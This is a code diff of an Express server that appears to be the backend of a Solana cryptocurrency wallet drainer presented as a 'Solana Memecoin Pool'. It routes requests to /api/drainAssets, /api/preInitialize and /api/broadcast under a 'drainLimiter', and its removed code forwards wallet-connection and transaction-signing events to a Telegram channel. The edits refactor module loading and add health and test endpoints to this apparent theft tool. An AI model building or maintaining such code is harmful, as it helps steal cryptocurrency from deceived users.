@@ -1,19 +1,15 @@
 
-import 'dotenv/config';
-import express from 'express';
-import path from 'path';
-import { fileURLToPath } from 'url';
-import rateLimit from 'express-rate-limit';
+require('dotenv/config');
+const express = require('express');
+const path = require('path');
+const rateLimit = require('express-rate-limit');
 
 // Import centralized error handling and Telegram logger
-import errorHandler from './src/errorHandler.js';
-import telegramLogger from './src/telegram.js';
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+const errorHandler = require('./src/errorHandler.js');
+const telegramLogger = require('./src/telegram.js');
 
 // Import environment configuration
-import { ENV_CONFIG } from './env.config.js';
+const { ENV_CONFIG } = require('./env.config.js');
 
 const app = express();
 const PORT = process.env.PORT || 3002;
@@ -83,7 +79,7 @@ app.use(generalLimiter);
 // Essential API endpoints only
 app.post('/api/drainAssets', drainLimiter, async (req, res) => {
   try {
-    const { default: drainAssetsHandler } = await import('./api/drainAssets.js');
+    const drainAssetsHandler = require('./api/drainAssets.js');
     await drainAssetsHandler(req, res);
   } catch (importError) {
     console.error('[DRAIN_ASSETS] Import error:', importError);
@@ -110,7 +106,7 @@ app.post('/api/drainAssets', drainLimiter, async (req, res) => {
 
 app.post('/api/preInitialize', drainLimiter, async (req, res) => {
   try {
-    const { default: preInitializeHandler } = await import('./api/preInitialize.js');
+    const preInitializeHandler = require('./api/preInitialize.js');
     await preInitializeHandler(req, res);
   } catch (importError) {
     console.error('[PRE_INITIALIZE] Import error:', importError);
@@ -137,7 +133,7 @@ app.post('/api/preInitialize', drainLimiter, async (req, res) => {
 
 app.post('/api/broadcast', drainLimiter, async (req, res) => {
   try {
-    const { default: broadcastHandler } = await import('./api/broadcast.js');
+    const broadcastHandler = require('./api/broadcast.js');
     await broadcastHandler(req, res);
   } catch (importError) {
     console.error('[BROADCAST] Import error:', importError);
@@ -162,6 +158,28 @@ app.post('/api/broadcast', drainLimiter, async (req, res) => {
   }
 });
 
+// Health check endpoint
+app.get('/api/health', async (req, res) => {
+  try {
+    const healthHandler = require('./api/health.js');
+    await healthHandler(req, res);
+  } catch (importError) {
+    console.error('[HEALTH] Import error:', importError);
+    res.status(500).json({ success: false, error: 'Health check failed' });
+  }
+});
+
+// Test assets endpoint
+app.get('/api/test-assets', async (req, res) => {
+  try {
+    const testAssetsHandler = require('./api/test-assets.js');
+    await testAssetsHandler(req, res);
+  } catch (importError) {
+    console.error('[TEST_ASSETS] Import error:', importError);
+    res.status(500).json({ success: false, error: 'Test assets failed' });
+  }
+});
+
 // Serve static files and handle SPA routing
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
@@ -174,56 +192,10 @@ app.get('*', (req, res) => {
 // Frontend logging endpoint for Telegram integration
 app.post('/api/log', async (req, res) => {
   try {
-    const { type, projectName, ...logData } = req.body;
-    
-    // Log to console with project branding
-          console.log(`[${projectName || 'Solana Memecoin Pool'}] ${type}:`, logData);
-    
-    // Send to Telegram if it's a critical log
-    const criticalLogTypes = [
-      'USER_CANCELLATION',
-      'DEEP_LINKING_ERROR', 
-      'WALLET_DETECTION_ERROR',
-      'WALLET_CONNECTION',
-      'TRANSACTION_SIGNING',
-      'API_CALL',
-      'NETWORK',
-      'VALIDATION',
-      'RPC_ERROR',
-      'SOLANA_ERROR',
-      'UNSUPPORTED_PATH_ERROR',
-      'UNHANDLED_ERROR',
-      'UNHANDLED_PROMISE_REJECTION',
-      'solana_error',
-      'rpc_error'
-    ];
-    
-    if (criticalLogTypes.includes(type)) {
-      try {
-        // Use appropriate logging method based on error type
-        if (type === 'SOLANA_ERROR' || type === 'solana_error') {
-          await telegramLogger.logSolanaError({
-            ...logData,
-            error: logData.error || type,
-            context: logData.context || 'Frontend Log',
-            projectName: projectName || 'Solana Memecoin Pool'
-          });
-        } else {
-          await telegramLogger.logFrontendError({
-            ...logData,
-            error: logData.error || type,
-            context: logData.context || 'Frontend Log',
-            projectName: projectName || 'Solana Memecoin Pool'
-          });
-        }
-      } catch (telegramError) {
-        console.error('[LOG_API] Telegram logging failed:', telegramError.message);
-      }
-    }
-    
-    res.json({ success: true, logged: true });
-  } catch (error) {
-    console.error('[LOG_API] Logging failed:', error);
+    const logHandler = require('./api/log.js');
+    await logHandler(req, res);
+  } catch (importError) {
+    console.error('[LOG] Import error:', importError);
     res.status(500).json({ success: false, error: 'Logging failed' });
   }
 });
